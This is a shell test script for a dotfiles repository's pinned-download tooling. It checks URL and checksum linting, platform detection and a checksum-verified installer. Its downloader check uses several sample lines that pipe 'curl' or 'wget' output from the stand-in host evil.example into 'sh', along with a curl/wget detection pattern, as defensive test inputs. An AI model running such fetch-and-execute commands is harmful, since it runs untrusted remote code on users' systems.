#!/bin/sh

set -eu

unset DOTFILES_PLATFORM DOTFILES_SHA256_TOOL

fail() {
  echo "check-pins: $*" >&2
  exit 1
}

repo=$(CDPATH='' cd -- "$(dirname "$0")/.." && pwd -P) || exit 1
cd "$repo"
git rev-parse --is-inside-work-tree >/dev/null 2>&1 || \
  fail "repository checks require a Git checkout"

test_root=$(mktemp -d) || exit 1
cleanup() {
  rm -rf "$test_root"
}
trap cleanup EXIT
trap 'cleanup; exit 1' HUP INT TERM

pin_script=$repo/mk/pinned.sh
real_pins=$repo/setup/pins/downloads.txt

echo "check-pins: canonical pins"
DOTFILES_PINS_FILE=$real_pins sh "$pin_script" lint

expect_lint_failure() {
  label=$1
  file=$2
  if DOTFILES_PINS_FILE=$file sh "$pin_script" lint >/dev/null 2>&1; then
    fail "accepted $label"
  fi
}

bad=$test_root/bad-pins.txt
awk 'BEGIN { changed = 0 } !changed && /https:\/\// { sub("https://", "http://"); changed = 1 } { print }' \
  "$real_pins" > "$bad"
expect_lint_failure "a non-HTTPS URL" "$bad"

awk 'BEGIN { changed = 0 } !changed && /releases\/download\/v2026\.9\.0/ {
  sub("releases/download/v2026.9.0", "releases/download/master"); changed = 1
} { print }' "$real_pins" > "$bad"
expect_lint_failure "a mutable URL" "$bad"

awk 'BEGIN { changed = 0 } /^#/ { print; next } !changed { $4 = "deadbeef"; changed = 1 } { print }' \
  "$real_pins" > "$bad"
expect_lint_failure "a short checksum" "$bad"

awk 'BEGIN { copied = 0 } { print } !copied && $0 !~ /^#/ { print; copied = 1 }' \
  "$real_pins" > "$bad"
expect_lint_failure "a duplicate platform pin" "$bad"

awk 'BEGIN { changed = 0 } /^#/ { print; next } !changed { NF = 6; changed = 1 } { print }' \
  "$real_pins" > "$bad"
expect_lint_failure "a six-field pin" "$bad"

awk '$3 != "darwin-arm64"' "$real_pins" > "$bad"
expect_lint_failure "incomplete mise platform coverage" "$bad"

awk 'BEGIN { changed = 0 } /^#/ { print; next } !changed {
  $5 = "https://raw.githubusercontent.com/example/repo/0123456789012345678901234567890123456789/main/file"; changed = 1
} { print }' "$real_pins" > "$bad"
expect_lint_failure "a mutable raw GitHub URL" "$bad"

awk 'BEGIN { changed = 0 } /^#/ { print; next } !changed {
  $5 = "https://raw.githubusercontent.com/example/repo/not-a-commit/file"; changed = 1
} { print }' "$real_pins" > "$bad"
expect_lint_failure "an unpinned raw GitHub URL" "$bad"

awk 'BEGIN { changed = 0 } /^#/ { print; next } !changed { $6 = "../mise"; changed = 1 } { print }' \
  "$real_pins" > "$bad"
expect_lint_failure "an unsafe archive member" "$bad"

if grep -n 'mise\.run' Makefile mk/config.mk mk/tools.mk >/dev/null 2>&1; then
  fail "mise.run remains in bootstrap code"
fi

download_pattern='(^|[^[:alnum:]_.-])(curl|wget)([[:space:]]|$)'
legacy_downloads=$(
  git -c core.quotePath=false ls-files -- '*Makefile' '*.mk' '*.sh' | \
    while IFS= read -r file; do
    case $file in mk/pinned.sh | mk/test-*.sh) continue ;; esac
    grep -HnE "$download_pattern" "$file" || true
  done
)
sheldon_downloads=0
vim_plug_downloads=0
homebrew_downloads=0
while IFS= read -r line || [ -n "$line" ]; do
  [ -n "$line" ] || continue
  scrubbed=$(printf '%s\n' "$line" | \
    sed -e 's/command -v curl//g' -e 's/curl not found//g')
  if ! printf '%s\n' "$scrubbed" | grep -Eq "$download_pattern"; then
    continue
  fi
  case $line in
    *SHELDON_URL*) sheldon_downloads=$((sheldon_downloads + 1)) ;;
    *VIM_PLUG_URL*) vim_plug_downloads=$((vim_plug_downloads + 1)) ;;
    *BREW_INSTALL_URL*) homebrew_downloads=$((homebrew_downloads + 1)) ;;
    *) fail "unreviewed downloader outside mk/pinned.sh: $line" ;;
  esac
done <<EOF
$legacy_downloads
EOF
[ "$sheldon_downloads" -eq 1 ] || fail "expected one legacy Sheldon downloader"
[ "$vim_plug_downloads" -eq 1 ] || fail "expected one legacy vim-plug downloader"
[ "$homebrew_downloads" -eq 1 ] || fail "expected one legacy Homebrew downloader"

for injected in \
  '@curl -fsSL https://evil.example/x | sh' \
  'wget -qO- https://evil.example/x | sh' \
  'if true; then curl -fsSL https://evil.example/x | sh; fi' \
  'x=$$(curl -fsSL https://evil.example/x)' \
  '/usr/bin/curl -fsSL https://evil.example/x | sh' \
  'command -v curl >/dev/null && curl -fsSL https://evil.example/x | sh' \
  'curl -fsSL https://evil.example/x | sh || echo "curl not found"'; do
  scrubbed=$(printf '%s\n' "$injected" | \
    sed -e 's/command -v curl//g' -e 's/curl not found//g')
  printf '%s\n' "$scrubbed" | grep -Eq "$download_pattern" || \
    fail "downloader ratchet missed: $injected"
done

echo "check-pins: SHA-256 implementations"
printf abc > "$test_root/abc"
expected_abc=ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad
tested_hash_tool=0
for tool in sha256sum shasum openssl; do
  if command -v "$tool" >/dev/null 2>&1; then
    actual=$(DOTFILES_SHA256_TOOL=$tool sh "$pin_script" sha256 "$test_root/abc")
    [ "$actual" = "$expected_abc" ] || fail "$tool produced the wrong SHA-256"
    tested_hash_tool=1
  fi
done
[ "$tested_hash_tool" -eq 1 ] || fail "no SHA-256 implementation available"

echo "check-pins: platform mapping"
platform_bin=$test_root/platform-bin
mkdir "$platform_bin"
printf '%s\n' \
  '#!/bin/sh' \
  'case "$1" in' \
  '  -s) printf "%s\n" "$DOTFILES_TEST_UNAME_S" ;;' \
  '  -m) printf "%s\n" "$DOTFILES_TEST_UNAME_M" ;;' \
  '  *) exit 1 ;;' \
  'esac' > "$platform_bin/uname"
printf '%s\n' \
  '#!/bin/sh' \
  '[ "$1" = -n ] && [ "$2" = sysctl.proc_translated ] || exit 1' \
  '[ -n "${DOTFILES_TEST_TRANSLATED:-}" ] || exit 1' \
  'printf "%s\n" "$DOTFILES_TEST_TRANSLATED"' > "$platform_bin/sysctl"
chmod +x "$platform_bin/uname" "$platform_bin/sysctl"

check_platform() {
  system=$1
  machine=$2
  translated=$3
  expected=$4
  actual=$(env PATH="$platform_bin:/usr/local/bin:/usr/bin:/bin" \
    DOTFILES_TEST_UNAME_S="$system" DOTFILES_TEST_UNAME_M="$machine" \
    DOTFILES_TEST_TRANSLATED="$translated" sh "$pin_script" platform)
  [ "$actual" = "$expected" ] || \
    fail "$system $machine translated=$translated mapped to $actual, not $expected"
}

check_platform Linux x86_64 '' linux-amd64
check_platform Linux amd64 '' linux-amd64
check_platform Linux aarch64 '' linux-arm64
check_platform Linux arm64 '' linux-arm64
check_platform Darwin x86_64 0 darwin-amd64
check_platform Darwin x86_64 1 darwin-arm64
check_platform Darwin arm64 '' darwin-arm64

if env PATH="$platform_bin:/usr/local/bin:/usr/bin:/bin" \
  DOTFILES_TEST_UNAME_S=Linux DOTFILES_TEST_UNAME_M=riscv64 \
  sh "$pin_script" platform >/dev/null 2>&1; then
  fail "accepted unsupported riscv64"
fi
if env PATH="$platform_bin:/usr/local/bin:/usr/bin:/bin" \
  DOTFILES_TEST_UNAME_S=FreeBSD DOTFILES_TEST_UNAME_M=amd64 \
  sh "$pin_script" platform >/dev/null 2>&1; then
  fail "accepted unsupported FreeBSD"
fi

echo "check-pins: verified installer"
fixtures=$test_root/fixtures
fixture_tree=$test_root/fixture-tree
stub_bin=$test_root/stub-bin
mkdir -p "$fixtures" "$fixture_tree/mise/bin" "$stub_bin"
printf '%s\n' '#!/bin/sh' 'echo "mise 1.2.3"' > "$fixture_tree/mise/bin/mise"
chmod +x "$fixture_tree/mise/bin/mise"
archive=$fixtures/mise-1.2.3.tar.gz
(cd "$fixture_tree" && tar -czf "$archive" mise/bin/mise)
archive_hash=$(sh "$pin_script" sha256 "$archive")
member_hash=$(sh "$pin_script" sha256 "$fixture_tree/mise/bin/mise")
fixture_pins=$test_root/downloads.txt
printf '%s\n' \
  "mise 1.2.3 linux-amd64 $archive_hash https://github.com/example/mise/releases/download/v1.2.3/mise-1.2.3.tar.gz mise/bin/mise $member_hash" \
  > "$fixture_pins"

printf '%s\n' \
  '#!/bin/sh' \
  'printf "%s\n" "$*" >> "$DOTFILES_TEST_CURL_LOG"' \
  'output=' \
  'url=' \
  'saw_proto=0' \
  'saw_redirect=0' \
  'while [ "$#" -gt 0 ]; do' \
  '  case $1 in' \
  '    --proto) shift; [ "${1:-}" = "=https" ] || exit 91; saw_proto=1 ;;' \
  '    --proto-redir) shift; [ "${1:-}" = "=https" ] || exit 92; saw_redirect=1 ;;' \
  '    -o) shift; output=${1:-} ;;' \
  '    https://*) url=$1 ;;' \
  '  esac' \
  '  shift' \
  'done' \
  '[ "$saw_proto" -eq 1 ] && [ "$saw_redirect" -eq 1 ] || exit 93' \
  '[ -n "$output" ] && [ -n "$url" ] || exit 94' \
  'case ${DOTFILES_TEST_CURL_MODE:-copy} in' \
  '  fail) exit 95 ;;' \
  '  truncate) printf truncated > "$output" ;;' \
  '  copy) cp "$DOTFILES_TEST_FIXTURES/${url##*/}" "$output"; chmod 0600 "$output" ;;' \
  '  *) exit 96 ;;' \
  'esac' > "$stub_bin/curl"
chmod +x "$stub_bin/curl"

curl_log=$test_root/curl.log
destination=$test_root/bin/mise
run_installer() {
  env -i HOME="$test_root/home" PATH="$stub_bin:/usr/local/bin:/usr/bin:/bin" \
    DOTFILES_PLATFORM=linux-amd64 DOTFILES_PINS_FILE="$fixture_pins" \
    DOTFILES_TEST_CURL_LOG="$curl_log" DOTFILES_TEST_FIXTURES="$fixtures" \
    DOTFILES_TEST_CURL_MODE=copy \
    sh "$pin_script" install mise "$destination" 0755
}

: > "$curl_log"
run_installer >/dev/null
[ -x "$destination" ] || fail "fresh install is not executable"
[ "$(sh "$pin_script" sha256 "$destination")" = "$member_hash" ] || \
  fail "fresh install has the wrong content"
[ "$(wc -l < "$curl_log" | tr -d ' ')" -eq 1 ] || fail "fresh install did not download once"

: > "$curl_log"
run_installer >/dev/null
[ ! -s "$curl_log" ] || fail "pinned rerun accessed the network"

printf drifted > "$destination"
: > "$curl_log"
run_installer > "$test_root/replace.out"
grep -F "replacing $destination" "$test_root/replace.out" >/dev/null || \
  fail "drift replacement was not reported"
[ "$(sh "$pin_script" sha256 "$destination")" = "$member_hash" ] || \
  fail "drifted install was not repaired"

assert_failed_install_preserves_destination() {
  label=$1
  mode=$2
  pins=$3
  printf keep-this > "$destination"
  before=$(sh "$pin_script" sha256 "$destination")
  if env -i HOME="$test_root/home" PATH="$stub_bin:/usr/local/bin:/usr/bin:/bin" \
    DOTFILES_PLATFORM=linux-amd64 DOTFILES_PINS_FILE="$pins" \
    DOTFILES_TEST_CURL_LOG="$curl_log" DOTFILES_TEST_FIXTURES="$fixtures" \
    DOTFILES_TEST_CURL_MODE="$mode" \
    sh "$pin_script" install mise "$destination" 0755 >/dev/null 2>&1; then
    fail "$label succeeded"
  fi
  after=$(sh "$pin_script" sha256 "$destination")
  [ "$before" = "$after" ] || fail "$label changed the existing destination"
  for leaked in "$test_root/bin"/.pinned.*; do
    if [ -e "$leaked" ] || [ -L "$leaked" ]; then
      fail "$label leaked a temporary directory"
    fi
  done
}

bad_archive_pins=$test_root/bad-archive.txt
printf '%s\n' \
  "mise 1.2.3 linux-amd64 $(printf '%064d' 0) https://github.com/example/mise/releases/download/v1.2.3/mise-1.2.3.tar.gz mise/bin/mise $member_hash" \
  > "$bad_archive_pins"
assert_failed_install_preserves_destination "archive checksum mismatch" copy "$bad_archive_pins"

bad_member_pins=$test_root/bad-member.txt
printf '%s\n' \
  "mise 1.2.3 linux-amd64 $archive_hash https://github.com/example/mise/releases/download/v1.2.3/mise-1.2.3.tar.gz mise/bin/mise $(printf '%064d' 0)" \
  > "$bad_member_pins"
assert_failed_install_preserves_destination "member checksum mismatch" copy "$bad_member_pins"
assert_failed_install_preserves_destination "curl failure" fail "$fixture_pins"
assert_failed_install_preserves_destination "truncated download" truncate "$fixture_pins"

missing_member_pins=$test_root/missing-member.txt
printf '%s\n' \
  "mise 1.2.3 linux-amd64 $archive_hash https://github.com/example/mise/releases/download/v1.2.3/mise-1.2.3.tar.gz mise/bin/missing $member_hash" \
  > "$missing_member_pins"
assert_failed_install_preserves_destination "missing archive member" copy "$missing_member_pins"

symlink_tree=$test_root/symlink-tree
mkdir -p "$symlink_tree/mise/bin"
ln -s target "$symlink_tree/mise/bin/mise"
symlink_archive=$fixtures/symlink.tar.gz
(cd "$symlink_tree" && tar -czf "$symlink_archive" mise/bin/mise)
symlink_hash=$(sh "$pin_script" sha256 "$symlink_archive")
symlink_pins=$test_root/symlink-pins.txt
printf '%s\n' \
  "mise 1.2.3 linux-amd64 $symlink_hash https://github.com/example/mise/releases/download/v1.2.3/symlink.tar.gz mise/bin/mise $member_hash" \
  > "$symlink_pins"
assert_failed_install_preserves_destination "symlink archive member" copy "$symlink_pins"

wrong_version_pins=$test_root/wrong-version.txt
printf '%s\n' \
  "mise 9.9.9 linux-amd64 $archive_hash https://github.com/example/mise/releases/download/v9.9.9/mise-1.2.3.tar.gz mise/bin/mise $member_hash" \
  > "$wrong_version_pins"
assert_failed_install_preserves_destination "version mismatch" copy "$wrong_version_pins"

raw=$fixtures/raw.txt
printf 'raw fixture\n' > "$raw"
raw_hash=$(sh "$pin_script" sha256 "$raw")
raw_pins=$test_root/raw-pins.txt
printf '%s\n' \
  "raw-tool 1.0.0 any $raw_hash https://raw.githubusercontent.com/example/repo/0123456789012345678901234567890123456789/raw.txt" \
  > "$raw_pins"
raw_destination=$test_root/raw-installed.txt
env -i HOME="$test_root/home" PATH="$stub_bin:/usr/local/bin:/usr/bin:/bin" \
  DOTFILES_PLATFORM=linux-amd64 DOTFILES_PINS_FILE="$raw_pins" \
  DOTFILES_TEST_CURL_LOG="$curl_log" DOTFILES_TEST_FIXTURES="$fixtures" \
  sh "$pin_script" install raw-tool "$raw_destination" 0644 >/dev/null
[ "$(sh "$pin_script" sha256 "$raw_destination")" = "$raw_hash" ] || \
  fail "raw-file install has the wrong content"

raw_executable=$fixtures/raw-tool
printf '%s\n' '#!/bin/sh' 'echo "raw-tool 1.0.0"' > "$raw_executable"
raw_executable_hash=$(sh "$pin_script" sha256 "$raw_executable")
raw_executable_pins=$test_root/raw-executable-pins.txt
printf '%s\n' \
  "raw-tool 1.0.0 any $raw_executable_hash https://github.com/example/raw-tool/releases/download/v1.0.0/raw-tool" \
  > "$raw_executable_pins"
raw_executable_destination=$test_root/raw-tool
env -i HOME="$test_root/home" PATH="$stub_bin:/usr/local/bin:/usr/bin:/bin" \
  DOTFILES_PLATFORM=linux-amd64 DOTFILES_PINS_FILE="$raw_executable_pins" \
  DOTFILES_TEST_CURL_LOG="$curl_log" DOTFILES_TEST_FIXTURES="$fixtures" \
  sh "$pin_script" install raw-tool "$raw_executable_destination" 0755 >/dev/null
[ -x "$raw_executable_destination" ] || fail "raw executable install is not executable"

chmod 0644 "$raw_executable_destination"
: > "$curl_log"
env -i HOME="$test_root/home" PATH="$stub_bin:/usr/local/bin:/usr/bin:/bin" \
  DOTFILES_PLATFORM=linux-amd64 DOTFILES_PINS_FILE="$raw_executable_pins" \
  DOTFILES_TEST_CURL_LOG="$curl_log" DOTFILES_TEST_FIXTURES="$fixtures" \
  sh "$pin_script" install raw-tool "$raw_executable_destination" 0755 >/dev/null
[ -x "$raw_executable_destination" ] || fail "pinned rerun did not repair executable mode"
[ ! -s "$curl_log" ] || fail "mode repair accessed the network"

fetch_destination=$test_root/fetched.txt
env -i HOME="$test_root/home" PATH="$stub_bin:/usr/local/bin:/usr/bin:/bin" \
  DOTFILES_PLATFORM=linux-amd64 DOTFILES_PINS_FILE="$raw_pins" \
  DOTFILES_TEST_CURL_LOG="$curl_log" DOTFILES_TEST_FIXTURES="$fixtures" \
  sh "$pin_script" fetch raw-tool "$fetch_destination"
[ "$(sh "$pin_script" sha256 "$fetch_destination")" = "$raw_hash" ] || \
  fail "fetch has the wrong content"

if env DOTFILES_PLATFORM=darwin-arm64 DOTFILES_PINS_FILE="$fixture_pins" \
  sh "$pin_script" status mise "$destination" >/dev/null 2>&1; then
  fail "accepted a pin for the wrong platform"
fi

echo "check-pins: Make wiring"
make_destination=$test_root/make-bin/mise
: > "$curl_log"
env -i HOME="$test_root/home" PATH="$stub_bin:/usr/local/bin:/usr/bin:/bin" \
  DOTFILES_PLATFORM=linux-amd64 DOTFILES_TEST_CURL_LOG="$curl_log" \
  DOTFILES_TEST_FIXTURES="$fixtures" \
  make -s -C "$repo" DOWNLOAD_PINS_FILE="$fixture_pins" MISE_BIN="$make_destination" mise >/dev/null
[ -x "$make_destination" ] || fail "make mise did not install the fixture"
: > "$curl_log"
env -i HOME="$test_root/home" PATH="$stub_bin:/usr/local/bin:/usr/bin:/bin" \
  DOTFILES_PLATFORM=linux-amd64 DOTFILES_TEST_CURL_LOG="$curl_log" \
  DOTFILES_TEST_FIXTURES="$fixtures" \
  make -s -C "$repo" DOWNLOAD_PINS_FILE="$fixture_pins" MISE_BIN="$make_destination" mise >/dev/null
[ ! -s "$curl_log" ] || fail "make mise rerun accessed the network"

echo "check-pins: ok"
